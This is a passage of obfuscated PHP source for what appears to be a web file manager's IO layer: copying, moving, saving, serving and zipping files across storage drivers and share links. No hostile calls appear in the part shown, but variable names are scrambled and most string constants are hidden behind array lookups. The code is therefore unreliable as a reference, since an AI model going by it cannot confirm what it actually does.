self::copyMoveStart($ÅÕß¾ÙÀ[$ûíŠÃÏÀ[87]], $ÀµôÕ¼±, $ëÔíãÑÖ, $ıï«à†Ğ, !1); } if ($ıï«à†Ğ == $ûíŠÃÏÀ[635]) { self::remove($Â¬œœã); } } private static function copyMoveStart($úú–Öšª, $Ø‚î²÷Á, $ÓØŒøĞ‹, $æÁºíÏ, $â‚¨¼¼à) { $ø¤ä·õæ =& $_SERVER[É¨™èà]; $øì»¤µ² = array($úú–Öšª, $Ø‚î²÷Á, $ÓØŒøĞ‹, $â‚¨¼¼à); Hook::trigger($ø¤ä·õæ[1245] . $æÁºíÏ . $ø¤ä·õæ[1246], $øì»¤µ²); $ÙõŒ¹­Ù = self::copyMove($úú–Öšª, $Ø‚î²÷Á, $ÓØŒøĞ‹, $æÁºíÏ, $â‚¨¼¼à); Hook::trigger($ø¤ä·õæ[1245] . $æÁºíÏ . $ø¤ä·õæ[1249], $øì»¤µ², $ÙõŒ¹­Ù); return $ÙõŒ¹­Ù; } public static function saveFile($çìïï¸, $İ…ôºı¯, $í¥÷İŞ€ = true) { $ªÜ‘µï =& $_SERVER[É¨™èà]; $ö—Ó½ë‡ = self::info($İ…ôºı¯); $Ù»Î®ÄÙ = self::driverMake($çìïï¸); $»ƒ—€¼ä = self::driverMake($İ…ôºı¯); $°ƒøçùê = !1; if ($»ƒ—€¼ä->pathParse[$ªÜ‘µï[1250]]) { $°ƒøçùê = $»ƒ—€¼ä; $Ò”ÚâÄ = $»ƒ—€¼ä->pathParse[$ªÜ‘µï[1250]]; $»ƒ—€¼ä = self::driverMake($Ò”ÚâÄ); } if ($Ù»Î®ÄÙ->pathParse[$ªÜ‘µï[1250]]) { $š”¶ûìÓ = $Ù»Î®ÄÙ->pathParse[$ªÜ‘µï[1250]]; $Ù»Î®ÄÙ = self::driverMake($š”¶ûìÓ); } $ì‹‰—§ı = $»ƒ—€¼ä->pathFather($İ…ôºı¯); $ºìÓÒ¸­ = !0; if (!$í¥÷İŞ€ && self::driverIsSame($Ù»Î®ÄÙ, $»ƒ—€¼ä)) { $ºìÓÒ¸­ = !1; } $ô°¯Ñä¿ = self::copyFile($Ù»Î®ÄÙ, $çìïï¸, $»ƒ—€¼ä, $ì‹‰—§ı, $ö—Ó½ë‡[$ªÜ‘µï[32]], $ºìÓÒ¸­); if ($°ƒøçùê) { $ô°¯Ñä¿ = $°ƒøçùê->getPathOuter($ô°¯Ñä¿); } return $ô°¯Ñä¿; } private static function copyMove($¥ÜÓåèï, $ÜÕ›•• , $…Í‘Í©¼, $ğËê÷—§, $°Ôõß¿ = false) { $¶£±Õƒ† =& $_SERVER[É¨™èà]; if (!$¥ÜÓåèï || $¥ÜÓåèï == $¶£±Õƒ†[8] || !$ÜÕ›•• ) { return !1; } ignore_timeout(); $õ‘»¦€ = self::driverMake($¥ÜÓåèï); $íØÕíøà = self::driverMake($ÜÕ›•• ); $Â¯³é¢ = $ğËê÷—§ == $¶£±Õƒ†[635]; $˜¿‹—ƒ„ = !1; if ($íØÕíøà->pathParse[$¶£±Õƒ†[1250]]) { $˜¿‹—ƒ„ = $íØÕíøà; $ÜÕ›••  = $íØÕíøà->pathParse[$¶£±Õƒ†[1250]]; $íØÕíøà = self::driverMake($ÜÕ›•• ); } if ($õ‘»¦€->pathParse[$¶£±Õƒ†[1250]]) { $¥ÜÓåèï = $õ‘»¦€->pathParse[$¶£±Õƒ†[1250]]; $õ‘»¦€ = self::driverMake($¥ÜÓåèï); } self::check($õ‘»¦€, $¥ÜÓåèï, $íØÕíøà, $ÜÕ›•• ); Hook::trigger($¶£±Õƒ†[1251], $õ‘»¦€, $¥ÜÓåèï, $íØÕíøà, $ÜÕ›•• ); $ª”Ÿ¸… = self::driverIsSame($õ‘»¦€, $íØÕíøà); if ($ª”Ÿ¸…) { if ($ğËê÷—§ == $¶£±Õƒ†[635] && !method_exists($íØÕíøà, $¶£±Õƒ†[1252]) && trim($ÜÕ›•• , $¶£±Õƒ†[8]) == trim($íØÕíøà->pathFather($¥ÜÓåèï), $¶£±Õƒ†[8])) { if ($õ‘»¦€->pathThis($¥ÜÓåèï) != $°Ôõß¿ && !$õ‘»¦€->isOsDriver()) { return $õ‘»¦€->rename($¥ÜÓåèï, $°Ôõß¿); } return $íØÕíøà->getPathOuter($¥ÜÓåèï); } if (method_exists($íØÕíøà, $ğËê÷—§)) { return $íØÕíøà->{$ğËê÷—§}($¥ÜÓåèï, $ÜÕ›•• , $…Í‘Í©¼, $°Ôõß¿); } } if ($ª”Ÿ¸… && $ğËê÷—§ == $¶£±Õƒ†[635] && $íØÕíøà->getType() == $¶£±Õƒ†[109]) { $‡¡´—º¹ = $íØÕíøà->movePath($¥ÜÓåèï, $ÜÕ›•• , $°Ôõß¿); if ($‡¡´—º¹) { return $‡¡´—º¹; } } $Ù¼±ßÊ­ = $õ‘»¦€->isFile($¥ÜÓåèï); if (!$Ù¼±ßÊ­ && $íØÕíøà->getType() == $¶£±Õƒ†[848] && $õ‘»¦€->getType() == $¶£±Õƒ†[109]) { $‡¡´—º¹ = $íØÕíøà->copyFolderFromIO($õ‘»¦€, $¥ÜÓåèï, $ÜÕ›•• , $…Í‘Í©¼, $Â¯³é¢, $°Ôõß¿); } else { $‡¡´—º¹ = self::copyPath($õ‘»¦€, $¥ÜÓåèï, $íØÕíøà, $ÜÕ›•• , $…Í‘Í©¼, $Â¯³é¢, $Ù¼±ßÊ­, $°Ôõß¿); } if ($‡¡´—º¹ && $Â¯³é¢) { $õ‘»¦€->remove($¥ÜÓåèï); } if ($˜¿‹—ƒ„) { $‡¡´—º¹ = $˜¿‹—ƒ„->getPathOuter($‡¡´—º¹); } return $‡¡´—º¹; } private static function check($öıºùò¤, $¢ôÛ®ÍÁ, $¾¶˜ÓÖÙ, &$šÀúù’) { $§î¼¨”© =& $_SERVER[É¨™èà]; if (self::driverIsSame($öıºùò¤, $¾¶˜ÓÖÙ) && $öıºùò¤->isFolder($¢ôÛ®ÍÁ) && $öıºùò¤->isParentOf($¢ôÛ®ÍÁ, $šÀúù’)) { show_json(LNG($§î¼¨”©[1253]), !1); } if (!$öıºùò¤->exist($¢ôÛ®ÍÁ)) { show_json(LNG($§î¼¨”©[108]), !1); } } private static function copyPath($âúÁ‡Ëâ, $Ë”áÕêü, $ò›É”•û, $¼öáÇá, $Ø¢°ğ˜, $Ÿ•ùº¶Ç, $¤­ñâá’, $Æ£¢âø¶ = false, $ı¨ôÒÆ = true) { $´œª†£³ =& $_SERVER[É¨™èà]; $‘—¤Ú³” = empty($Æ£¢âø¶) && $Æ£¢âø¶ !== $´œª†£³[231] ? $âúÁ‡Ëâ->pathThis($Ë”áÕêü) : $Æ£¢âø¶; if ($Ø¢°ğ˜) { $–ë¦Š¾ = $ò›É”•û->fileNameExist($¼öáÇá, $‘—¤Ú³”); $¾£Ğùó× = $‘—¤Ú³”; $‘—¤Ú³” = $ò›É”•û->fileNameAuto($¼öáÇá, $‘—¤Ú³”, $Ø¢°ğ˜, !$¤­ñâá’); if (!$–ë¦Š¾ || $¾£Ğùó× != $‘—¤Ú³”) { $Ø¢°ğ˜ = !1; } if ($ı¨ôÒÆ && !$Ø¢°ğ˜) { $ò›É”•û->_data[$´œª†£³[1254]] = !0; } } if ($¤­ñâá’) { return self::copyFile($âúÁ‡Ëâ, $Ë”áÕêü, $ò›É”•û, $¼öáÇá, $‘—¤Ú³”, $Ÿ•ùº¶Ç); } if ($Ø¢°ğ˜ == REPEAT_RENAME_FOLDER) { $Ø¢°ğ˜ = !1; } $ÌÛ§ğÏı = rtrim($¼öáÇá, $´œª†£³[8]) . $´œª†£³[8] . $‘—¤Ú³”; $‰úË©† = $ò›É”•û->mkdir($ò›É”•û->getPath($ÌÛ§ğÏı), $Ø¢°ğ˜); $¼öáÇá = $ò›É”•û->getPathInner($‰úË©†); $¨ß“äèç = $âúÁ‡Ëâ->listPath($Ë”áÕêü, !0); $¨ß“äèç = is_array($¨ß“äèç) ? $¨ß“äèç : array($´œª†£³[86] => array(), $´œª†£³[85] => array()); $åƒòŠÀ = array_merge($¨ß“äèç[$´œª†£³[86]], $¨ß“äèç[$´œª†£³[85]]); foreach ($åƒòŠÀ as $È²à¹) { $Ñö‡¸è = $È²à¹[$´œª†£³[33]] == $´œª†£³[233]; $Ë”áÕêü = $âúÁ‡Ëâ->getPathInner($È²à¹[$´œª†£³[87]]); $îËÑÔÔ± = self::copyPath($âúÁ‡Ëâ, $Ë”áÕêü, $ò›É”•û, $¼öáÇá, $Ø¢°ğ˜, $Ÿ•ùº¶Ç, $Ñö‡¸è, !1, !1); if (!$îËÑÔÔ±) { IO::errorTips($´œª†£³[1255] . $Ë”áÕêü . $´œª†£³[73] . $¼öáÇá); } } self::copyMoveKeepInfo($âúÁ‡Ëâ, $Ë”áÕêü, $‰úË©†); return $‰úË©†; } private static function copyFile($¹µ»®Çà, $¶æšÒˆƒ, $ú­¬³¡¨, $çã±¸Á£, $‚‡½¿ñ, $¿úÚø÷Õ) { $ş¹£ú¡Ä =& $_SERVER[É¨™èà]; $çã±¸Á£ = $ú­¬³¡¨->getPath(rtrim($çã±¸Á£, $ş¹£ú¡Ä[8]) . $ş¹£ú¡Ä[8] . $‚‡½¿ñ); $‘Ô¶Ñ’ = $ş¹£ú¡Ä[1256] . time() . rand_string(5); Hook::trigger($ş¹£ú¡Ä[1257], $¹µ»®Çà, $¶æšÒˆƒ, $ú­¬³¡¨, $çã±¸Á£, $‚‡½¿ñ, $‘Ô¶Ñ’); if (self::driverIsSame($¹µ»®Çà, $ú­¬³¡¨)) { if ($¿úÚø÷Õ) { $­«Ú«¢“ = $ú­¬³¡¨->moveFile($¶æšÒˆƒ, $çã±¸Á£); } else { $­«Ú«¢“ = $ú­¬³¡¨->copyFile($¶æšÒˆƒ, $çã±¸Á£); } Hook::trigger($ş¹£ú¡Ä[1258], $¹µ»®Çà, $¶æšÒˆƒ, $ú­¬³¡¨, $çã±¸Á£, $‚‡½¿ñ, $­«Ú«¢“); self::copyMoveKeepInfo($¹µ»®Çà, $¶æšÒˆƒ, $­«Ú«¢“); return $­«Ú«¢“; } $Æóú‘‡š = TEMP_FILES; if ($GLOBALS[$ş¹£ú¡Ä[6]][$ş¹£ú¡Ä[92]][$ş¹£ú¡Ä[889]]) { $Æóú‘‡š = $GLOBALS[$ş¹£ú¡Ä[6]][$ş¹£ú¡Ä[92]][$ş¹£ú¡Ä[889]]; } $Ë˜ŸØä‰ = $Æóú‘‡š; mk_dir($Ë˜ŸØä‰); $Üæ³‹ = $Ë˜ŸØä‰ . $‘Ô¶Ñ’; $„»ˆãßÄ = $Üæ³‹; $Üæ³‹ = $¹µ»®Çà->download($¶æšÒˆƒ, $Üæ³‹); $Üæ³‹ = $¹µ»®Çà->iconvApp($Üæ³‹); if (substr($Üæ³‹, strlen($Æóú‘‡š)) == $Æóú‘‡š) { $¿úÚø÷Õ = !0; } $­«Ú«¢“ = $ú­¬³¡¨->upload($çã±¸Á£, $Üæ³‹, $¿úÚø÷Õ); self::remove($„»ˆãßÄ); Hook::trigger($ş¹£ú¡Ä[1258], $¹µ»®Çà, $¶æšÒˆƒ, $ú­¬³¡¨, $çã±¸Á£, $‚‡½¿ñ, $­«Ú«¢“); self::copyMoveKeepInfo($¹µ»®Çà, $¶æšÒˆƒ, $­«Ú«¢“); return $­«Ú«¢“; } private static function copyMoveKeepInfo($ãˆ®§ÏÖ, $¾†èÙ, $­×’£û¼) { if (!$­×’£û¼) { return; } $µà—¤ = $ãˆ®§ÏÖ->info($¾†èÙ); if (!is_array($µà—¤)) { return; } IO::setModifyTime($­×’£û¼, $µà—¤[$_SERVER[É¨™èà][88]]); } public static function pathFather($«Ç‹Ê’) { $—ò¦ş£í = IO::init($«Ç‹Ê’); $×Èø†§Ç = $—ò¦ş£í->pathFather($—ò¦ş£í->path); return $—ò¦ş£í->getPathOuter($×Èø†§Ç); } public static function fileOut($ËŞÖ°µ…, $ïÃÔ¼çÍ = false, $óäò¦à¤ = false, $ŸÆğƒ’ = '') { $Å¨»òìø = self::driverMake($ËŞÖ°µ…); if ($Å¨»òìø->isFileOutServer()) { return $Å¨»òìø->fileOutServer($ËŞÖ°µ…, $ïÃÔ¼çÍ, $óäò¦à¤, $ŸÆğƒ’); } return $Å¨»òìø->fileOut($ËŞÖ°µ…, $ïÃÔ¼çÍ, $óäò¦à¤, $ŸÆğƒ’); } public static function fileOutImage($Á¥¸¿æÍ, $“ğ¦£› = 250) { $£Ú¢Õ¦ = array(250, 600, 1200, 2000, 3000, 5000); for ($Ùêõ©ğç = 0; $Ùêõ©ğç < count($£Ú¢Õ¦); $Ùêõ©ğç++) { if ($Ùêõ©ğç == 0 && $“ğ¦£› <= $£Ú¢Õ¦[$Ùêõ©ğç]) { $“ğ¦£› = $£Ú¢Õ¦[$Ùêõ©ğç]; break; } else { if ($“ğ¦£› > $£Ú¢Õ¦[$Ùêõ©ğç - 1] && $“ğ¦£› <= $£Ú¢Õ¦[$Ùêõ©ğç]) { $“ğ¦£› = $£Ú¢Õ¦[$Ùêõ©ğç]; break; } else { if ($Ùêõ©ğç == count($£Ú¢Õ¦) - 1 && $“ğ¦£› > $£Ú¢Õ¦[$Ùêõ©ğç]) { $“ğ¦£› = $£Ú¢Õ¦[$Ùêõ©ğç]; break; } } } } $—‰Ì…‹’ = self::driverMake($Á¥¸¿æÍ); if ($—‰Ì…‹’->isFileOutServer()) { return $—‰Ì…‹’->fileOutImageServer($Á¥¸¿æÍ, $“ğ¦£›); } return $—‰Ì…‹’->fileOutImage($Á¥¸¿æÍ, $“ğ¦£›); } private static function driverIsSame($…šƒ±Â‹, $Áú©Ûª…) { $í¦°¦§€ =& $_SERVER[É¨™èà]; $ÓÚŠ„ı  = $…šƒ±Â‹->getType(); $ìè× Ûµ = $Áú©Ûª…->getType(); if ($ÓÚŠ„ı  != $ìè× Ûµ) { return !1; } if ($ÓÚŠ„ı  == $í¦°¦§€[848]) { return !0; } if ($ÓÚŠ„ı  == $í¦°¦§€[109]) { return !0; } if ($…šƒ±Â‹->pathDriver == $Áú©Ûª…->pathDriver) { return !0; } return !1; } public static function copyUpdate($…Ö‰‘–ú, $üÅÄÆ®) { $õ½©½½ =& $_SERVER[É¨™èà]; if (!IO::exist($…Ö‰‘–ú)) { return !1; } if (!IO::exist($üÅÄÆ®)) { IO::mkdir($üÅÄÆ®); } $„îà®¤• = array_to_keyvalue(self::listAllSimple($…Ö‰‘–ú), $õ½©½½[87]); $»—ï­Ç = array_to_keyvalue(self::listAllSimple($üÅÄÆ®), $õ½©½½[87]); $ğÁÊà = array(); $Ş¯ŒÖ‹» = array(); foreach ($„îà®¤• as $ßÆ‰õ´¦ => $Ïûö¥Ï) { if (isset($»—ï­Ç[$ßÆ‰õ´¦])) { if ($Ïûö¥Ï[$õ½©½½[78]] == 1) { continue; } if ($»—ï­Ç[$ßÆ‰õ´¦][$õ½©½½[79]] == $Ïûö¥Ï[$õ½©½½[79]]) { continue; } } if ($Ïûö¥Ï[$õ½©½½[78]] == 1) { $Ş¯ŒÖ‹»[] = $üÅÄÆ® . $õ½©½½[8] . trim($ßÆ‰õ´¦, $õ½©½½[8]); continue; } $šÉˆï » = strstr(trim($ßÆ‰õ´¦, $õ½©½½[8]), $õ½©½½[8]) ? get_path_father($ßÆ‰õ´¦) : $õ½©½½[12]; $ğÁÊà[] = array($õ½©½½[1259] => $Ïûö¥Ï[$õ½©½½[89]], $õ½©½½[1260] => rtrim($üÅÄÆ®, $õ½©½½[8]) . $õ½©½½[8] . $šÉˆï », $õ½©½½[1261] => $Ïûö¥Ï); } $¡’£÷É = array($õ½©½½[233] => $ğÁÊà, $õ½©½½[78] => $Ş¯ŒÖ‹»); Hook::trigger($õ½©½½[1262], $…Ö‰‘–ú, $üÅÄÆ®, $¡’£÷É); foreach ($Ş¯ŒÖ‹» as $Ïûö¥Ï) { IO::mkdir($Ïûö¥Ï); } foreach ($ğÁÊà as $Ïûö¥Ï) { IO::copy($Ïûö¥Ï[$õ½©½½[1259]], $Ïûö¥Ï[$õ½©½½[1260]], REPEAT_REPLACE); } } public static function fileSubstr($™Ï²¨À, $šãĞÌ´, $‡¹‹Ú«¶ = false) { $§û‘¶¡‚ =& $_SERVER[É¨™èà]; $¿Ú²İï‡ = self::driverMake($™Ï²¨À); $ªûâÉü = $¿Ú²İï‡->size($™Ï²¨À); $õ²ÙÕæá = $šãĞÌ´; $ßßôèäâ = $‡¹‹Ú«¶; if ($šãĞÌ´ < 0) { $šãĞÌ´ = $ªûâÉü + $šãĞÌ´; } if ($‡¹‹Ú«¶ === !1) { $‡¹‹Ú«¶ = $ªûâÉü - $šãĞÌ´; } if ($šãĞÌ´ + $‡¹‹Ú«¶ > $ªûâÉü) { $‡¹‹Ú«¶ = $ªûâÉü - $šãĞÌ´; } if (!$ªûâÉü && $¿Ú²İï‡->getType() == $§û‘¶¡‚[109] && !$¿Ú²İï‡->exist($™Ï²¨À)) { $ë¸—° = get_path_this($™Ï²¨À); $æÑ”ÏÚÀ = parse_url_query($ë¸—°); if (is_array($æÑ”ÏÚÀ) && isset($æÑ”ÏÚÀ[$§û‘¶¡‚[32]])) { $ë¸—° = urldecode($æÑ”ÏÚÀ[$§û‘¶¡‚[32]]); } throw new Exception($§û‘¶¡‚[1263] . LNG($§û‘¶¡‚[1264]) . $§û‘¶¡‚[1060] . clear_html($ë¸—°) . $§û‘¶¡‚[12]); } if ($‡¹‹Ú«¶ <= 0) { return $§û‘¶¡‚[12]; } if ($šãĞÌ´ < 0 || $šãĞÌ´ >= $ªûâÉü || $‡¹‹Ú«¶ > $GLOBALS[$§û‘¶¡‚[6]][$§û‘¶¡‚[92]][$§û‘¶¡‚[1265]]) { throw new Exception("\x66\x69\x6c\x65\x52\145\141\144\x20\x65\x72\162\157\162\x2c\157\x76\x65\162\40\151\x6f\122\145\141\144\x4d\141\x78\41\x20\163\x74\141\x72\x74\x3d{$šãĞÌ´}\73\154\145\x6e\x67\x74\x68\x3d{$‡¹‹Ú«¶}\73\x20\x73\151\172\x65\75{$ªûâÉü}\x3b"); } $£ìÙŞ› = $¿Ú²İï‡->fileSubstr($™Ï²¨À, $šãĞÌ´, $‡¹‹Ú«¶); if (!$£ìÙŞ› && $‡¹‹Ú«¶ && isset($GLOBALS[$§û‘¶¡‚[1266]])) { throw new Exception($GLOBALS[$§û‘¶¡‚[1266]][$§û‘¶¡‚[1267]]); } return $£ìÙŞ›; } private static function driverMake(&$áîÒø‰¦) { $çè³Ù‡  =& $_SERVER[É¨™èà]; $²û§¿’« = KodIO::parse($áîÒø‰¦); if (!self::$driverListSystem) { $şºÒçÀå = Model($çè³Ù‡ [858])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($şºÒçÀå, $çè³Ù‡ [485]); } if ($²û§¿’«[$çè³Ù‡ [33]] == KodIO::KOD_IO && !self::$driverListSystem[$²û§¿’«[$çè³Ù‡ [485]]]) { throw new Exception($çè³Ù‡ [1268]); return !1; } $áîÒø‰¦ = $²û§¿’«[$çè³Ù‡ [1269]]; $»×‰êÚˆ = self::driverGet($²û§¿’«, $áîÒø‰¦); return $»×‰êÚˆ; } private static function driverGet($Š÷ä¿Šã, &$™Ã°‚µ) { $’ì°¿ö =& $_SERVER[É¨™èà]; $¶¦èà”î = $Š÷ä¿Šã[$’ì°¿ö[1270]]; $‹Éú‹£” = $Š÷ä¿Šã[$’ì°¿ö[485]]; switch ($Š÷ä¿Šã[$’ì°¿ö[33]]) { case KodIO::KOD_IO: $é¦Ë¾ß… = self::$driverListSystem[$‹Éú‹£”]; break; case KodIO::KOD_SOURCE: $™Ã°‚µ = $‹Éú‹£” . $™Ã°‚µ; $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1272], $’ì°¿ö[6] => $Š÷ä¿Šã); $é¦Ë¾ß…[$’ì°¿ö[6]][$’ì°¿ö[1273]] = $Š÷ä¿Šã[$’ì°¿ö[485]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $éó‹Âç´ = $GLOBALS[$’ì°¿ö[1274]]; self::$driverListUser = array_to_keyvalue($éó‹Âç´, $’ì°¿ö[485]); } $é¦Ë¾ß… = self::$driverListUser[$‹Éú‹£”]; break; case KodIO::KOD_SHARE_LINK: $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1275], $’ì°¿ö[6] => $Š÷ä¿Šã); $®‰Ç¤¡Ù = Action($’ì°¿ö[1276])->sharePathInfo($Š÷ä¿Šã[$’ì°¿ö[87]]); $™Ã°‚µ = $®‰Ç¤¡Ù[$’ì°¿ö[194]]; if (!$®‰Ç¤¡Ù[$’ì°¿ö[194]]) { $§âŸğŞ¿ = Model($’ì°¿ö[679])->getInfo($®‰Ç¤¡Ù[$’ì°¿ö[680]]); $™Ã°‚µ = KodIO::clear($§âŸğŞ¿[$’ì°¿ö[1277]] . $Š÷ä¿Šã[$’ì°¿ö[1269]]); $Š÷ä¿Šã[$’ì°¿ö[572]] = $§âŸğŞ¿; $Š÷ä¿Šã[$’ì°¿ö[1250]] = $™Ã°‚µ; $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1278], $’ì°¿ö[6] => $Š÷ä¿Šã); } else { $é¦Ë¾ß…[$’ì°¿ö[6]][$’ì°¿ö[1273]] = $®‰Ç¤¡Ù[$’ì°¿ö[194]]; } break; case KodIO::KOD_SHARE_ITEM: $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1279], $’ì°¿ö[6] => $Š÷ä¿Šã); $§âŸğŞ¿ = Model($’ì°¿ö[679])->getInfo($Š÷ä¿Šã[$’ì°¿ö[485]]); if ($§âŸğŞ¿[$’ì°¿ö[194]] == $’ì°¿ö[231]) { $™Ã°‚µ = KodIO::clear($§âŸğŞ¿[$’ì°¿ö[1277]] . $Š÷ä¿Šã[$’ì°¿ö[1269]]); $Š÷ä¿Šã[$’ì°¿ö[572]] = $§âŸğŞ¿; $Š÷ä¿Šã[$’ì°¿ö[1250]] = $™Ã°‚µ; $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1280], $’ì°¿ö[6] => $Š÷ä¿Šã); } else { if (!$™Ã°‚µ) { $™Ã°‚µ = $§âŸğŞ¿[$’ì°¿ö[194]]; } $é¦Ë¾ß…[$’ì°¿ö[6]][$’ì°¿ö[1273]] = $§âŸğŞ¿[$’ì°¿ö[194]]; } break; default: $™Ã°‚µ = $Š÷ä¿Šã[$’ì°¿ö[87]]; $é¦Ë¾ß… = array($’ì°¿ö[1271] => $’ì°¿ö[1281]); break; } $´´¬ı¦™ = $Š÷ä¿Šã[$’ì°¿ö[87]]; if (!isset(self::$driverCache[$´´¬ı¦™])) { $Íâˆ¹Çë = strtolower($é¦Ë¾ß…[$’ì°¿ö[98]]); $æ§ìÑŞà = $GLOBALS[$’ì°¿ö[6]][$’ì°¿ö[92]][$’ì°¿ö[922]]; $şŒèğ²· = $’ì°¿ö[77] . (isset($æ§ìÑŞà[$Íâˆ¹Çë]) ? $æ§ìÑŞà[$Íâˆ¹Çë] : ucfirst($Íâˆ¹Çë)); if (!class_exists($şŒèğ²·)) { show_json("{$şŒèğ²·}\40\156\157\164\x20\145\x78\x69\163\164\163\x21", !1); } $ó¼÷¶¥ = isset($é¦Ë¾ß…[$’ì°¿ö[6]]) ? $é¦Ë¾ß…[$’ì°¿ö[6]] : !1; self::$driverCache[$´´¬ı¦™] = new $şŒèğ²·($ó¼÷¶¥); } $×æù©€ = self::$driverCache[$´´¬ı¦™]; $×æù©€->pathDriver = $¶¦èà”î; $×æù©€->pathBase = $’ì°¿ö[12]; if (isset($é¦Ë¾ß…[$’ì°¿ö[6]][$’ì°¿ö[1282]])) { $×æù©€->pathBase = rtrim($é¦Ë¾ß…[$’ì°¿ö[6]][$’ì°¿ö[1282]], $’ì°¿ö[8]) . $’ì°¿ö[8]; $™Ã°‚µ = $×æù©€->pathBase . ltrim($™Ã°‚µ, $’ì°¿ö[8]); } $™Ã°‚µ = $×æù©€->getPath($™Ã°‚µ); if (isset($Š÷ä¿Šã[$’ì°¿ö[1250]])) { $™Ã°‚µ = $Š÷ä¿Šã[$’ì°¿ö[1250]]; } $×æù©€->path = $™Ã°‚µ; return $×æù©€; } public static function errorTips($Ô‰“¶ĞŸ = false) { $´ÑûÛÖ‚ =& $_SERVER[É¨™èà]; static $µè€äÈ = array(); $šéÉ¼€ = 1000; if ($Ô‰“¶ĞŸ === -1) { return $µè€äÈ ? $µè€äÈ[count($µè€äÈ) - 1] : $´ÑûÛÖ‚[12]; } if ($Ô‰“¶ĞŸ === !1) { return implode($´ÑûÛÖ‚[288], $µè€äÈ); } if (count($µè€äÈ) >= $šéÉ¼€) { $µè€äÈ = array_slice($µè€äÈ, $šéÉ¼€ * 0.5, $šéÉ¼€); } $µè€äÈ[] = $Ô‰“¶ĞŸ; write_log($´ÑûÛÖ‚[176] . ACTION . $´ÑûÛÖ‚[1283] . $Ô‰“¶ĞŸ, $´ÑûÛÖ‚[1284]); } public static function getLastError($©æ¼‚ÕË = '') { $êÓÁ‚êå = self::errorTips(-1); return $êÓÁ‚êå ? $êÓÁ‚êå : $©æ¼‚ÕË; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ßœ†§Ğû; if ($ßœ†§Ğû) { return $ßœ†§Ğû; } $æßĞæ­Ú = IO::init($_SERVER[É¨™èà][8]); return $æßĞæ­Ú; } private static function iconvSystem($˜¡Îİòæ) { return self::local()->iconvSystem($˜¡Îİòæ); } private static function iconvApp($§äÉêåê) { return self::local()->iconvApp($§äÉêåê); } public static function zipFolder($Åüù¦ğ, $×÷„ô…ú = "\x7a\x69\x70", $ìíµÉÓã = '', $éâ”¨ôó = REPEAT_RENAME) { $øõåáî® =& $_SERVER[É¨™èà]; $äâÛ ûØ = IO::listPath($Åüù¦ğ); if (!$äâÛ ûØ) { return !1; } $äâÛ ûØ = array_merge($äâÛ ûØ[$øõåáî®[85]], $äâÛ ûØ[$øõåáî®[86]]); return self::zip($äâÛ ûØ, $×÷„ô…ú, $ìíµÉÓã, $éâ”¨ôó); } public static function zip($Šˆ·ÒÜÁ, $¦¡ÛÜİ¹ = "\x7a\151\160", $ö£µ¨¯Ş = '', $—ˆÓ¢Ó° = REPEAT_RENAME) { $Ñ½ªÃ—é =& $_SERVER[É¨™èà]; if (is_string($Šˆ·ÒÜÁ) && $Šˆ·ÒÜÁ) { $Šˆ·ÒÜÁ = array(array($Ñ½ªÃ—é[87] => $Šˆ·ÒÜÁ)); } $Ú±Ğì°· = self::init($Šˆ·ÒÜÁ[0][$Ñ½ªÃ—é[87]]); $ú·–£îƒ = self::info($Šˆ·ÒÜÁ[0][$Ñ½ªÃ—é[87]]); $ö‰¤üèÔ = $Ñ½ªÃ—é[12]; $™²ÍÅ·Õ = $Ñ½ªÃ—é[12]; $™»Ò·àç = $Ñ½ªÃ—é[12]; if ($ö£µ¨¯Ş && substr($ö£µ¨¯Ş, -1, 1) != $Ñ½ªÃ—é[8]) { $™²ÍÅ·Õ = get_path_father($ö£µ¨¯Ş); $™»Ò·àç = get_path_this($ö£µ¨¯Ş); } else { $™²ÍÅ·Õ = self::pathFather($ú·–£îƒ[$Ñ½ªÃ—é[87]]); $™»Ò·àç = $ú·–£îƒ[$Ñ½ªÃ—é[32]] . $Ñ½ªÃ—é[10] . $¦¡ÛÜİ¹; if (count($Šˆ·ÒÜÁ) > 1) { $²ÆÙ¶Æ† = IO::info($™²ÍÅ·Õ); $™»Ò·àç = $²ÆÙ¶Æ†[$Ñ½ªÃ—é[32]] . $Ñ½ªÃ—é[10] . $¦¡ÛÜİ¹; } if ($ö£µ¨¯Ş) { $™²ÍÅ·Õ = $ö£µ¨¯Ş; } } if ($Ú±Ğì°·->getType() == $Ñ½ªÃ—é[109]) { $±ß­ıè = self::init($™²ÍÅ·Õ); $åöÎùËÁ = $±ß­ıè->getType() == $Ñ½ªÃ—é[109] ? $™²ÍÅ·Õ : get_path_father($Ú±Ğì°·->path); $åöÎùËÁ = IO::getPathInner($åöÎùËÁ); $åöÎùËÁ = rtrim($åöÎùËÁ, $Ñ½ªÃ—é[8]) . $Ñ½ªÃ—é[8]; mk_dir($åöÎùËÁ); } else { $ö‰¤üèÔ = TEMP_FILES . $Ñ½ªÃ—é[1285] . time() . rand_string(8) . $Ñ½ªÃ—é[8]; mk_dir($ö‰¤üèÔ); file_put_contents($ö‰¤üèÔ . $Ñ½ªÃ—é[1286], $Ñ½ªÃ—é[12]); $åöÎùËÁ = $ö‰¤üèÔ; } $„¯©úìş = IO::info($åöÎùËÁ); if (!$„¯©úìş || !$„¯©úìş[$Ñ½ªÃ—é[236]]) { show_json(LNG($Ñ½ªÃ—é[1287]), !1); } $Ùö–ç “ = self::zipFileList($Šˆ·ÒÜÁ, $ö‰¤üèÔ); foreach ($Ùö–ç “ as $«Ï¶§Ø => $‹òÖ Í) { $Ùö–ç “[$«Ï¶§Ø] = self::iconvSystem($‹òÖ Í); } $¶Ë¹ÇÖ— = get_filename_auto($åöÎùËÁ . $™»Ò·àç, $Ñ½ªÃ—é[12], $—ˆÓ¢Ó°); KodArchive::create(self::iconvSystem($¶Ë¹ÇÖ—), $Ùö–ç “); if (!IO::exist($¶Ë¹ÇÖ—)) { if ($ö‰¤üèÔ) { del_dir($ö‰¤üèÔ); } write_log($Ñ½ªÃ—é[1288] . $¶Ë¹ÇÖ—, $Ñ½ªÃ—é[399]); show_json(LNG($Ñ½ªÃ—é[1289]), !1); } if (!$ö‰¤üèÔ) { return $¶Ë¹ÇÖ—; } $†¯¡¬úê = self::move($¶Ë¹ÇÖ—, 